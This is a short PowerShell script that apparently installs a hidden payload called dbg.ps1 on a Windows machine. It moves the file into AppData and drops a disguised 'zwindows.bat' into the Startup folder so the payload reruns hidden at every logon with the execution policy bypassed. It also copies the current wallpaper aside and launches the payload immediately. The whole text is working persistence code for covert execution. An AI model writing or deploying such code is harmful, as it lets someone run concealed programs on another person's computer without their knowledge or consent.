$uname = [System.Environment]::UserName
$ShortCutText = "@echo off && C:\Windows\System32\windowspowershell\v1.0\PowerShell.exe -WindowStyle hidden -ExecutionPolicy Bypass -File C:\users\$uname\Appdata\Roaming\dbg.ps1"
$ShortCutLocation = "C:\Users\$uname\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\zwindows.bat"
Move-Item "dbg.ps1" "C:\users\$uname\Appdata\Roaming\"
Set-Content -Path $ShortCutLocation -Value $ShortCutText
Copy-Item "C:\users\$uname\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" "C:\users\$uname\Documents\Old_Desktop_Background.png"
PowerShell.exe -WindowStyle hidden -ExecutionPolicy Bypass -File "C:\users\$uname\Appdata\Roaming\dbg.ps1"